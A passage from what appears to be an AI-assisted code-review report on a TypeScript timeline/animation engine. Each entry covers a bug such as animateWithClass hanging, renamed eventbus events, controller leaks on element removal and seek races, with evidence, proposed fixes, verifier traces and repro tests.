**Verifier.** I could not refute it. In src/operation/animate-with-class.ts (lines 44-51) the handler is bound with `selectedElement.on('animationend', handleAnimationEnd)`. There is no delegate selector and no check on `event.target` or `event.currentTarget`. `animationend` bubbles, and jQuery's direct `.on` fires for events bubbling up from descendants. So the first animationend from any descendant runs the handler. It calls `.off` on every selected element, removes `className` from all of them (removeClass defaults to true), and resolves the promise. No guard exists anywhere else. The operation is only exported from src/operation/index.ts, and nothing wraps it or filters events. The tests in src/test/unit/operation/animate-with-class.spec.ts do not cover this. Two of them use a MockElement that calls the handler directly, and the jQuery tests only trigger animationend on the selected element itself. None dispatches the event from a child, and none uses several selected elements.  A valid configuration can trigger it. The selected element only needs a descendant whose finite CSS animation ends before the element's own animation does. A common case is `.fade-in .icon {animation: pop .2s}` alongside `.fade-in {animation: fade 1s}`. A selector matching several elements with different durations also triggers it. Infinite animations, such as a looping spinner, never fire animationend, so the auditor's example only holds for a spinner with a finite duration. That narrows the scenario but does not remove it.  The impact is that later operations start too early and the class is removed while its animation is still running. Nothing crashes and engine state is not corrupted. I'd still call it medium, at the low end, because it is a visible timing error that a valid configuration can trigger.  One caveat on the suggested fix. Some configurations use a class that only animates descendants and has no animation on the element itself. Today those resolve because a child's event bubbles up. A strict target check would make them never resolve. The fix needs to handle that case, or the change needs to be documented.

**Repro test.** `given a selected element with a child span, when a bubbling animationend is dispatched from the child, then the animateWithClass promise is still pending and the parent keeps its class`

### 7. [medium] animateWithClass never settles for an empty selection or a class without an animation

[animate-with-class.ts:40](src/operation/animate-with-class.ts#L40) · area: operations-a · reported severity: medium · verifier: sonnet

**Summary.** The promise settles only when `animationend` fires. An empty jQuery set, a class that defines no animation, an element with `display:none`, or `animation:none` under prefers-reduced-motion means it never fires. The action then hangs forever, and later operations and action completion never happen. The sibling `animate` operation was fixed for the empty-set case in this round (see the comment at animate.ts:59), but animateWithClass was not.

**Failure scenario.** selectElement matches nothing (for example a typo in the selector), then animateWithClass {className:'show'}. The action start promise stays pending forever and no error is reported.

**Evidence.**

```ts
const promise = new Promise<...>((resolve, reject) => {
    try {
      const handleAnimationEnd = () => { ... internalResolve(resolve, {}, operationData); };
      selectedElement.on('animationend', handleAnimationEnd);
    } catch (e) {
      reject(e);
    }
  });

  selectedElement.addClass(className);
```

**Fix.** Mirror animate.ts and resolve at once (after erasing className and removeClass) when `selectedElement.length === 0`. After `addClass`, read `getComputedStyle(el)` for each element. If every element has `animationName === 'none'` or a total `animationDuration` plus `animationDelay` of 0, remove the class (if removeClass) and resolve right away. As a fallback, schedule a timeout at the longest computed duration plus delay plus a small margin, so a missed or cancelled `animationend` (display:none, element removed) still settles the operation. Make sure the handler and the timeout settle the promise only once, and unbind the handler in both paths. Add specs for an empty set and for a class with no animation.

Original suggestion: Resolve immediately when `selectedElement.length === 0`. After adding the class, check `getComputedStyle(el).animationName === 'none'` (or a zero animation duration) and resolve right away. Optionally add a timeout fallback based on the computed animation duration plus delay. Add specs for the empty-set and no-animation cases.

**Verifier.** I traced the code and the claim holds. In src/operation/animate-with-class.ts (lines 40-57), the promise settles only inside the `animationend` handler, or through `reject` if `.on()` throws synchronously. There is no length check, no computed-style check and no timeout. For an empty jQuery set, `.on('animationend', ...)` and `.addClass()` do nothing, so the handler can never run and the promise stays pending forever. Nothing upstream prevents this. selectElement (src/operation/select-element.ts:10-11) only calls console.warn when a selector matches nothing and still passes on the empty set, so a valid configuration with a mistyped or not-yet-rendered selector reaches this state. The same thing happens when the class defines no CSS animation or the element is display:none, because browsers do not fire `animationend` then. The sibling `animate` operation has exactly this guard (animate.ts:59-63, "jQuery never calls the complete callback for an empty set"); animateWithClass lacks it. The spec src/test/unit/operation/animate-with-class.spec.ts covers only the cases where `animationend` is triggered by hand, with nothing for an empty set or a class without an animation. Two points soften the impact. First, the summary says no error is reported, but selectElement does log a console.warn for the empty-selector case, though nothing ties it to the hang. Second, Action.start and EndableAction.end build separate operation stacks, so end operations still run. Only the remaining start operations and the start promise hang. That still breaks the action silently from a valid configuration, so medium severity stands.

**Repro test.** `given an empty jQuery selection, when animateWithClass runs, then the returned promise resolves without an animationend event`

### 8. [medium] Navigation/Routing controllers use 'video-url' events the engine no longer handles

[navigation-controller.ts:196](src/controllers/navigation-controller.ts#L196) · area: controllers · reported severity: medium · verifier: sonnet

**Summary.** NavigationController broadcasts 'request-video-url', and RoutingController listens for 'before-request-video-url' and asks 'request-current-video-position'. The engine side was renamed to 'request-timeline-uri' (EngineEventbusAdapter), 'before-request-timeline-uri' (RequestVideoUriInterceptor) and 'request-current-timeline-position'. Nothing in src handles or produces the video-url events, so in an EngineFactory setup menu clicks, autoNext and popstate navigation have no effect.

**Failure scenario.** Create an engine with EngineFactory and attach a NavigationController with two navigation items. Click the second menu item (mouseup): 'request-video-url' [1, 0] is broadcast, but no subscriber exists, so the engine never calls switchTimeline and the timeline keeps playing. RoutingController's before-request handler never fires, so no history entry is pushed.

**Evidence.**

```ts
navigation-controller.ts:196  this.eventbus?.broadcast('request-video-url', [
      index,
      requestedVideoPosition,
    ]);
routing-controller.ts:30  'before-request-video-url',
request-video-uri-interceptor.ts:7  this.eventbus.broadcast('before-request-timeline-uri', args.slice() as any);
engine-eventbus-adapter.ts:146  'request-timeline-uri',
```

**Fix.** Either: - Map each navigation entry to a timeline URI (for example a `timelineUri` field next to `videoUrlIndex`). NavigationController and RoutingController would then broadcast 'request-timeline-uri' [uri, position], listen to 'before-request-timeline-uri', use eventbus.request('request-current-timeline-position') instead of the callback broadcast, and drive autoNext from 'timeline-complete' instead of the never-emitted 'video-complete'. - Or mark both controllers and the video-url events @deprecated and document them as needing a host bridge.  Either way, add an integration test that attaches NavigationController to an engine built by EngineFactory and asserts that a menu mouseup switches currentTimelineUri.

Original suggestion: Either map navigation entries to timeline URIs and broadcast 'request-timeline-uri' / listen to 'before-request-timeline-uri' / request 'request-current-timeline-position', or document these controllers as needing a host-supplied bridge for the video-url events and mark them deprecated. Add an integration test that wires them through EngineFactory.

**Verifier.** I traced the claim through the code and it holds. A grep of src outside the tests finds no subscriber for 'request-video-url', 'navigate-to-video-url' or 'request-current-video-position', and nothing broadcasts 'before-request-video-url'.  The engine side only understands the timeline events: - EngineEventbusAdapter (src/adapters/engine-eventbus-adapter.ts:145-158) subscribes to 'request-timeline-uri', which calls switchTimeline(uri, position), and registers the request 'request-current-timeline-position'. - EngineFactory (src/engine-factory.ts:184-189) registers RequestVideoUriInterceptor only on 'request-timeline-uri'. The interceptor broadcasts 'before-request-timeline-uri', not the video-url variant.  The controllers only use the video events: - NavigationController._menuMouseupHandler calls _handleNavigateVideoUrl, which broadcasts 'request-video-url' [index, 0] (navigation-controller.ts:196). - _handleVideoComplete broadcasts 'request-video-url' for autoNext (navigation-controller.ts:217). - RoutingController listens to 'before-request-video-url' (routing-controller.ts:30), broadcasts 'request-video-url' on attach and on popstate (lines 51 and 73), and asks 'request-current-video-position' (line 144).  The payload shapes also differ. The controllers send a numeric videoUrlIndex, while the engine wants a string timeline URI, so no implicit bridge could exist.  The tests do not catch this. NavigationController.spec.ts and RoutingController.spec.ts use a mock eventbus and only check that 'request-video-url' was broadcast. No integration test wires either controller through EngineFactory.  What I found that softens it, without refuting it: 1. RoutingController's JSDoc says "This is a work in progress, do not use this yet please....", so that half is documented as unsupported. NavigationController has no such warning and CLAUDE.md lists it as an available controller. 2. 'video-complete', which drives autoNext, is also never emitted anywhere in src. autoNext is dead even apart from the rename. 3. The mismatch is old: git -S shows 'request-video-url' was only ever in the controllers and tests, so this is not a regression on this branch. 4. A host could in theory bridge the events with an eventAction on 'request-video-url', but nothing documents that.  Net effect: in a standard EngineFactory setup, NavigationController menu clicks highlight the menu and push history but never switch timelines. That is a real loss of the controller's core feature, reachable from a valid configuration. It is long-standing and limited to a legacy, video-index-based controller pair, one of which is marked WIP. Medium is defensible; I keep medium, leaning low because of the WIP label and how long it has gone unnoticed.

**Repro test.** `given an EngineFactory engine with two timelines and an attached NavigationController with two navigation items, when the second menu anchor receives mouseup, then engine.switchTimeline is called and currentTimelineUri becomes the second timeline`

### 9. [medium] SubtitlesController starts in the configured language, not the current locale

[subtitles-controller.ts:142](src/controllers/subtitles-controller.ts#L142) · area: controllers · reported severity: medium · verifier: sonnet

**Summary.** currentLanguage is taken only from operationData.language and updated only by later 'language-change' events. A subtitles controller attached after the user switched language shows the stale configured language. If `language` is omitted (it is not @required), currentLanguage is undefined and setTitle never renders anything until a language-change. LottieController already asks for the language with 'request-current-language', which LocaleEventbusAdapter answers.

**Failure scenario.** The engine starts in en-US and the user switches to nl-NL via a language selector (language-change nl-NL). Later, a timeline action runs addControllerToElement(SubtitlesController, {language: 'en-US', subtitleData}): the subtitles render in English while the rest of the UI is Dutch. With `language` omitted entirely, no subtitle is ever shown.

**Evidence.**

```ts
init(operationData: ISubtitlesControllerOperationData) {
    const container = operationData.selectedElement;
    this.removeTitle = this.removeTitle.bind(this, container);
    this.currentLanguage = operationData.language;
...
  setTitle(container: JQuery, titleLanguageLookup: Record<string, string>) {
    if (this.currentLanguage) {
```

**Fix.** In attach(), set `this.currentLanguage = eventbus.request<TLanguageCode>('request-current-language') ?? operationData.language ?? null;` before adding the listeners. operationData is not available in attach, so init() has to store the configured language in a field first. The live locale should win over the configured one, because the class doc promises the current language. No re-render is needed at attach time, because lastFunc is still null right after init(). Also add a unit test where the eventbus answers 'request-current-language' with 'nl-NL'.

Original suggestion: In attach, set `this.currentLanguage = eventbus.request('request-current-language') ?? operationData.language`, and re-render the current range if one is active.

**Verifier.** The report holds, and I found nothing elsewhere that prevents it.  1. **Where the language comes from.** In src/controllers/subtitles-controller.ts, init() (line 142) sets `currentLanguage = operationData.language`. The only other place that changes it is languageChangeHandler (line 55). attach() (lines 44-48) only adds listeners for 'timeline-time', 'timeline-seeked' and 'language-change'. It never asks for the current locale.  2. **Nothing replays the language on attach.** addControllerToElement (src/operation/add-controller-to-element.ts) calls init() and then attach(this.eventbus) and does nothing else. LocaleEventbusAdapter broadcasts 'language-change' only when the locale actually changes. It does not replay it for listeners that subscribe later, but it does answer 'request-current-language' with `localeManager.locale`. So a controller attached after a 'language-change' never learns about that switch.  3. **The failure scenario.** A user switches to nl-NL. Later, a timeline action's start operations run addControllerToElement with SubtitlesController and `language: 'en-US'`. currentLanguage becomes 'en-US', and setTitle renders `titleLanguageLookup['en-US']` until another switch happens. Adding the controller in a timeline action's start operations and removing it in the end operations is a normal pattern, so a valid configuration can trigger this.  4. **When `language` is missing.** `language` has no @required tag. If it is left out, currentLanguage is undefined, the `if (this.currentLanguage)` guard in setTitle fails, and no subtitle shows until a 'language-change' arrives.  5. **This is not intended behaviour.** The class doc says the controller shows the subtitle "in the current language". LottieController (line 169) already reads the locale with `eventbus.request('request-current-language')`, so the codebase already does this elsewhere.  6. **No test covers it.** Every case in src/test/unit/controllers/SubtitlesController.spec.ts passes `language: 'en-US'` and then broadcasts 'language-change'. None attaches the controller after a switch or leaves `language` out.  The one thing that limits it: when the controller is added in an init action, nothing has switched the language yet, so a matching configured language is correct. I am keeping the severity at medium, not lowering it. The subtitles show visibly in the wrong language, and with `language` left out (allowed, since it is optional) they never show at all.

**Repro test.** `given the eventbus answers request-current-language with nl-NL and the controller is configured with language en-US, when the controller is attached and timeline-time reaches a subtitle range, then the Dutch subtitle text is rendered`

### 10. [medium] end() runs during an action's async start; controllers attach after the end

[timeline-action.ts:40](src/action/timeline-action.ts#L40) · area: lens-lifecycle-memory · reported severity: medium · verifier: sonnet

**Summary.** TimelineAction.end() clears _active and runs the end operations at once, even when start() is still running async operations. The engine also calls end right after an un-awaited start for skipped or zero-length ranges, and ends actions on later ticks without waiting for earlier starts. Start operations that acquire resources after an await (addControllerToElement after loadJson, wait, animate, or a LottieController attach waiting on import()) therefore run after the end operations that should release them.

**Failure scenario.** A looping 10s RAF timeline has action [1.0, 1.1]. Its startOperations are [selectElement '#title', loadJson {url}, getControllerInstance 'LabelController', addControllerToElement] and its endOperations are [selectElement '#title', removeControllerFromElement 'LabelController']. At 1.1 the end runs while the fetch is pending: removeControllerFromElement warns 'not found'. Then the fetch resolves and a LabelController is attached with a language-change listener. Every loop adds one more controller and listener on the shared eventbus. On a frame skip over [1.0, 1.1] (endAfterStart) this happens on every pass.

**Evidence.**

```ts
timeline-action.ts: `end(initOperationData?) { if (!this._active) { return Promise.resolve({}); } this._active = false; return super.end(initOperationData); }`  eligius-engine.ts _runPendingStarts: `this._runActionMethod(action, 'start'); if (start.endAfterStart) { this._runActionMethod(action, 'end'); }`
```

**Fix.** In TimelineAction, keep the start that is in flight: `this._starting = super.start(data).finally(() => { if (this._starting === p) this._starting = undefined; })`. In end(), set _active=false synchronously, which keeps the dedupe invariant, and then chain the end operations onto that start: `const prior = this._starting ?? Promise.resolve(); return prior.then(noop, noop).then(() => super.end(data));`. Making TimelineAction serialise its own start and end means every caller is covered: _runPendingStarts, ends on later ticks, _reconcileActions and _endActiveActionsReporting. The engine needs no per-path awaits, so the RAF loop never blocks. Add a TimelineAction spec where a start operation returns a deferred promise followed by a second operation that records its call. Assert that the end operations do not run until that deferred promise resolves. Add an engine spec for the endAfterStart path with an async start operation.

Original suggestion: Keep the in-flight start promise in TimelineAction and have end() chain onto it: `const started = this._starting ?? Promise.resolve(); return started.catch(noop).then(() => super.end(data));`. Alternatively, have the engine await the start before dispatching the matching end. Add a spec with an async start operation.

**Verifier.** I traced the scenario through the real code and it holds. I found no guard against it.  1. TimelineAction.start (src/action/timeline-action.ts:31) sets _active=true synchronously, then calls Action._runOperations. Action.executeOperation (src/action/action.ts) runs operations synchronously until one returns a promise. At that point it returns and continues later in a .then. loadJson (src/operation/load-json.ts) is an async function, so it always returns a promise, even on a cache hit. So start() gives back control right after loadJson begins, and getControllerInstance and addControllerToElement have not run yet.  2. TimelineAction.end (line 40) only checks _active. It sets _active=false and calls EndableAction.end, which runs the end operations on a new scope stack. Nothing waits for the start that is still running, and no start promise is kept anywhere. A grep for _starting or startPromise in src/action and src/eligius-engine.ts finds nothing.  3. In EligiusEngine._runPendingStarts (src/eligius-engine.ts, around line 1159), `_runActionMethod(action,'start')` is called and its promise is not awaited. If endAfterStart is set, `_runActionMethod(action,'end')` follows on the next line. The docstring of _dispatchActionsBetween says it outright: "Nothing is awaited here." Ends on later ticks are also dispatched without waiting for earlier starts. The ends-before-starts ordering only covers ends of other actions within the same update. It does not cover an action's own start that is still running.  4. The end operations run synchronously. removeControllerFromElement (src/operation/remove-controller-from-element.ts) finds no controller, because addControllerToElement has not run yet. It logs a console.warn and returns without error. When the fetch resolves, addControllerToElement pushes the controller onto the element and attaches it to the eventbus. Since _active is false, the next loop pass (or the next skipped frame) starts the action again and adds another controller and listener.  The same race hits common configurations that use no controllers at all. Take a start of [selectElement, animateWithClass, addClass 'visible'] and an end of [selectElement, removeClass 'visible']. If the range is shorter than the animation, or frames are skipped, the class is left on the element. The tests do not cover this. The engine specs, including integration/engine-factory-lifecycle.spec.ts 'skipped RAF frames', only use synchronous operations, so the overlap never shows.  Severity stays medium. The trigger is a valid configuration: an async start operation plus end operations that undo what the start does. It also needs a short range, frame skips, a loop or a slow network. The result is a leaked listener and controller each pass, or DOM left in the wrong state. The engine state itself is not corrupted.

**Repro test.** `given a TimelineAction whose start operations are [async op awaiting a deferred, recordStart] and whose end operations are [recordEnd], when end() is called before the deferred resolves and the deferred then resolves, then recordEnd runs after recordStart`

### 11. [medium] removeElement/clearElement/setElementContent drop controllers without detaching them

[remove-element.ts:19](src/operation/remove-element.ts#L19) · area: lens-lifecycle-memory · reported severity: medium · verifier: sonnet

**Summary.** Controllers are stored in jQuery data on their element. jQuery's .remove(), .empty() and .html() run cleanData on the removed subtree, which discards the controller list without calling detach(). The controllers' eventbus listeners (and window popstate listeners) stay registered. Engine destroy() cannot find them either, because detachControllersWithin reads the same jQuery data that is now gone.

**Failure scenario.** Start operations add a ProgressbarController to '#bar' inside '#stage'. End operations are [selectElement '#stage', clearElement]. After the end, the controller's 'timeline-time' handler is still on the eventbus and updates a detached element on every tick. Each later start adds another. After factory destroy() the handlers remain on the factory eventbus, because detachControllersWithin finds no data. The same happens for a RoutingController, whose window 'popstate' listener survives.

**Evidence.**

```ts
remove-element.ts: `selectedElement.remove();`  clear-element.ts:19 `selectedElement.empty();`  set-element-content.ts:48 `selectedElement.html(template);`  attach-controller-to-element.ts: `element.data(controllersDataName, []);`  detach-controllers-within.ts: `if (!$.hasData(element)) { return; }`
```

**Fix.** Put the fix in shared code. Add a helper such as `detachControllersBeforeRemoval(nodes: JQuery, eventbus: IEventbus)` that calls detachControllersWithin and throws an AggregateError naming the operation if any errors come back. Call it in removeElement on `selectedElement`, in clearElement on `selectedElement.children()`, and in setElementContent only for 'overwrite', on `selectedElement.children()`. All three operations must become `function` expressions so that `this.eventbus` is available, because arrow functions do not bind `this`. In EligiusEngine._createLayoutTemplate, call detachControllersWithin(container.children(), this.eventbus) before `container.html(layoutTemplate)`. Note that detachControllersWithin uses `.find('*').addBack()`, so when it is passed `children()` it also covers the children themselves, which is the correct scope.

Original suggestion: Before removing nodes, call detachControllersWithin on the subtree that is going away: in removeElement call `detachControllersWithin(selectedElement, this.eventbus)`, in clearElement call it on `selectedElement.children()`, and in setElementContent call it on the children for 'overwrite'. Collect and rethrow the errors it returns. The engine's _createLayoutTemplate (`container.html(layoutTemplate)`) should do the same.

**Verifier.** I traced the scenario through the real code and it holds. attachControllerToElement (src/operation/helper/attach-controller-to-element.ts) keeps controllers only in jQuery data under 'eligiusEngineControllers'. removeElement calls `selectedElement.remove()`, clearElement calls `selectedElement.empty()`, and setElementContent's overwrite path calls `selectedElement.html(template)`. All three run jQuery.cleanData on the subtree being removed, which wipes that data without calling detach(). Nothing guards against this. None of the three operations looks at controllers, and none of the controllers (for example ProgressbarController.attach, which registers 'timeline-time' and 'timeline-duration' on the eventbus) watches for its element being removed. The only cleanup is in EligiusEngine.destroy() (src/eligius-engine.ts around line 722): it calls detachControllersWithin($(containerSelector)), which walks the live DOM and skips elements where `!$.hasData(element)`. Removed nodes are no longer in that DOM, and cleared nodes have lost their data, so these controllers are never detached. _createLayoutTemplate's `container.html(layoutTemplate)` has the same problem if the container already holds elements with controllers. I checked this with a temporary Vitest probe, since deleted: I attached a controller with a detach spy to #bar inside #stage, ran clearElement on #stage, then ran detachControllersWithin($('body')). It returned no errors and the detach spy was never called. A configuration can avoid the leak by running removeControllerFromElement before removing the element, but nothing enforces or documents that order. The failure needs only ordinary operations in a valid configuration. I found no existing test for it; the DOMEventListenerController specs remove a button, but not through these operations and not with a check for detach. Each run of the start operations adds another set of leaked handlers, and handlers held by a RoutingController or on a window object also survive destroy(). Medium severity is right: it leaks memory, leaves stale handlers running on every tick, and breaks the promise that destroy() releases everything, but it does not corrupt engine state.

**Repro test.** `given a controller attached to #bar inside #stage, when clearElement runs on #stage, then the controller's detach is called with the eventbus`

### 12. [medium] Engines on one factory share responders; first registered wins (request-engine-root etc.)

[engine-eventbus-adapter.ts:168](src/adapters/engine-eventbus-adapter.ts#L168) · area: lens-lifecycle-memory · reported severity: medium · verifier: sonnet

**Summary.** Every engine a factory creates is wired to the same eventbus. Each EngineEventbusAdapter and LocaleEventbusAdapter registers onRequest responders for the same names, and Eventbus.request returns the first responder. While two engines are live, every request from the second engine (selectElement's request-engine-root, request-translation, timeline-duration-request, request-current-language) is answered by the first engine. Broadcast commands such as timeline-play-request drive both engines.

**Failure scenario.** As in the integration test 'two live engines': factory.createEngine(configA) uses '#engine-root' and factory.createEngine(configB) uses '#engine-root-2'. Engine B's init action runs selectElement {selector:'.title'}. The request returns A's root, so B selects A's '.title', or nothing. B's LabelControllers translate with A's locale manager, and a timeline-play-request starts both engines.

**Evidence.**

```ts
engine-eventbus-adapter.ts: `this._registerRequest('request-engine-root', () => { return this._engine.engineRoot; });`  eventbus.ts _callResponder: `// First responder wins
 return responders[0](...args) as T;`  engine-factory.ts: `const engineEventbusAdapter = new EngineEventbusAdapter(engineInstance, this._eventbus);`
```

**Fix.** In createEngine, when no eventbus was supplied in options, create a new Eventbus for each engine. Register request-instance, request-action and request-function on it, bound to an engine-local actions lookup; this also fixes the `_actionsLookup` overwrite at engine-factory.ts:197. Pass that bus to the ConfigurationResolver, the engine and all three adapters, and return it as `result.eventbus`. The engine's removers should clear it on destroy. When the caller supplied `options.eventbus`, throw a clear error from a second createEngine while an engine on that bus is still live, and document "one live engine per eventbus" in the TypeDoc for IEngineFactoryOptions.eventbus and in the CHANGELOG.

Original suggestion: Give each engine its own eventbus scope, for example a child Eventbus per createEngine that forwards to the factory bus. Otherwise reject a second live createEngine on the same factory with a clear error, and document one engine per factory/eventbus.

**Verifier.** I traced the failure through the real code and it holds. No guard prevents it, and the codebase explicitly supports two live engines on one factory.  1. EngineFactory keeps one `_eventbus` (engine-factory.ts:82) and passes it to every createEngine call: to the ConfigurationResolver (line 192, so operation scopes get `this.eventbus` = the factory bus), to the engine (219), and to EngineEventbusAdapter / LocaleEventbusAdapter / EngineInputAdapter (229-242). The returned `eventbus` is also `this._eventbus`. createEngine has no per-engine scoping and no guard against a second live engine. 2. EngineEventbusAdapter.connect registers `onRequest` responders for request-current-timeline-position, timeline-duration-request, timeline-container-request, request-engine-root and timeline-request-current-timeline (lines 156-174). LocaleEventbusAdapter does the same for request-current-language and request-translation (lines 130-150). `Eventbus.onRequest` pushes onto one array per name, and `_callResponder` returns `responders[0](...args)` (eventbus.ts:230). So engine A's responder answers every request until A's destroy() removes it. 3. selectElement (select-element.ts:70) calls `this.eventbus.request('request-engine-root')` and searches under that root. With A and B both live, B's selectElement {selector:'.title'} searches under A's '#engine-root'. LabelController translations from B go to A's LocaleManager in the same way. 4. Broadcast commands (`timeline-play-request` etc.) are subscribed with `eventbus.on` by each adapter, so both engines react. 5. Multiple live engines per factory is an intended use case, not an unreachable state. The module-level `liveEngineCount` (engine-factory.ts:49) exists for it. The integration test 'given two live engines, when one is destroyed and then the other...' (engine-factory-lifecycle.spec.ts:516) creates engine B on the same factory with containerSelector '#engine-root-2'. That test only checks globals and never checks which engine answers requests, so nothing covers this. I found no docs, CHANGELOG entry or comment that limits a factory to one engine. A related symptom: `this._actionsLookup = actionLookup` (line 197) is overwritten by each createEngine, so 'request-action' always resolves against the last engine's actions.  Severity: medium is fair. Every valid configuration triggers it as soon as two engines share a factory (or a user-supplied eventbus): wrong DOM targets, wrong translations, and play/pause driving both engines. Using one factory per engine avoids it, and single-engine pages are the common case, so I would not raise it.

**Repro test.** `given two live engines created by one factory with roots '#engine-root' and '#engine-root-2', when engine B's init action runs selectElement {selector: '.title'}, then the selected element is the '.title' inside '#engine-root-2' (today it resolves against engine A's '#engine-root')`

### 13. [medium] Concurrent seek/switch/stop are not serialised, so stale actions stay active

[eligius-engine.ts:438](src/eligius-engine.ts#L438) · area: engine-core · reported severity: medium · verifier: sonnet

**Summary.** seek() computes its end/start lists once and then awaits them. A second seek, a stop() or a switch that runs during those awaits works from a different snapshot, and the first seek then starts actions for a position the engine has already left. Only switchTimeline is queued. seek() also reads `this._currentTimelineUri` after its await, so a seek overlapping a switch reconciles the new timeline at the old timeline's position. start() captures the source before awaiting stop cleanup and can activate a source that a switch has already replaced.

**Failure scenario.** Action C [0,3] is active and has an async end (a fade-out). Action A is [4,6] and B is [7,9]. The user clicks the progress bar at 5 and then at 8 while C is still fading. seek(5) computes toEnd=[C], toStart=[A] and awaits C.end. seek(8) computes toEnd=[] (C is already inactive and A not yet active) and toStart=[B], and starts B. When C's end settles, seek(5) starts A. At position 8, A [4,6] and B are both active. Forward dispatch from 8 never crosses A's end, so A stays on screen until the next seek or stop.

**Evidence.**

```ts
await this._seekSource(source, position);
    this._lastPosition = position;
    await this._reconcileActions(this._currentTimelineUri, position);
...
  async start(): Promise<void> {
    const source = this._activePositionSource;
    ...
    if (this._pendingStopCleanup) {
      await this._pendingStopCleanup;
    }
    await source.activate();
```

**Fix.** Fix the seek race with a generation counter, `private _reconcileGeneration = 0`. seek, stop, _switchTimeline and destroy each bump it.  seek() should capture `const gen = ++this._reconcileGeneration` and `const uri = this._currentTimelineUri` before its first await. It then passes both to `_reconcileActions(uri, position, gen)`.  `_reconcileActions` should run the ends as it does now. After they settle it should return early if `gen !== this._reconcileGeneration`. It should also rebuild the start list after the ends settle, with `timelineActions.filter(a => !a.active && coversPosition(a, position))`, instead of using the list it built before awaiting.  In start(), re-read the source after the await: `await this._pendingStopCleanup; const current = this._activePositionSource; if (!current) return; await current.activate();`.  Serialising seeks on `_switchQueue` would also work, but it would hold up later seeks behind slow end animations. The generation token lets the newest seek win.

Original suggestion: Put seek (and stop cleanup, and the activation in start) on the same queue as `_switchQueue`, or give each reconcile a generation token that later seeks/stops/switches bump, and skip remaining work when it is stale. Capture the timeline URI before the first await. In start(), re-read `_activePositionSource` after awaiting `_pendingStopCleanup`.

**Verifier.** I traced the scenario through F:\projects\eligius\eligius\src\eligius-engine.ts and F:\projects\eligius\eligius\src\action\timeline-action.ts and found no guard that stops it.  1. seek() (line 417) has no serialisation. Only switchTimeline goes through `_switchQueue` (line 466). seek clears `_pendingStarts`, awaits `_seekSource`, sets `_lastPosition` and awaits `_reconcileActions(this._currentTimelineUri, position)`. It never checks a generation token and never looks again after an await.  2. `_reconcileActions` (line 1177) builds actionsToEnd and actionsToStart in one synchronous step. It then runs `await _executeActions(actionsToEnd,'end')` followed by `await _executeActions(actionsToStart,'start')`. `_executeActions` (line 934) awaits each action in turn, so starts wait for every end to settle.  3. `TimelineAction.end()` sets `_active = false` synchronously, before its end operations run, and `start()` sets `_active = true` synchronously. So while seek(5) is waiting on C's async end, C is already inactive and A is not yet active.  4. A second seek(8) that arrives in that window builds toEnd=[] and toStart=[B], and starts B. When C's end settles, seek(5) carries on with its stale toStart=[A] and starts A. `TimelineAction.start` only refuses an action that is already active. Nothing checks whether A still covers the current position.  5. After that, `_lastPosition` is 8. `_onTimeHandler` and `_dispatchActionsBetween` only handle events in (8, to], so A's end at 6 is never crossed. A stays active until the next seek, stop or switch. The `_pendingStarts.clear()` in seek does not help, because reconcile starts actions directly and does not use `_pendingStarts`.  The trigger is realistic. Seeks come straight from the eventbus with no queue: EngineEventbusAdapter line 132 calls `engine.seek(position)` for every 'timeline-seek-request'. Async end operations are common (animateWithClass and similar fades). Two progress-bar clicks within the length of a fade is enough.
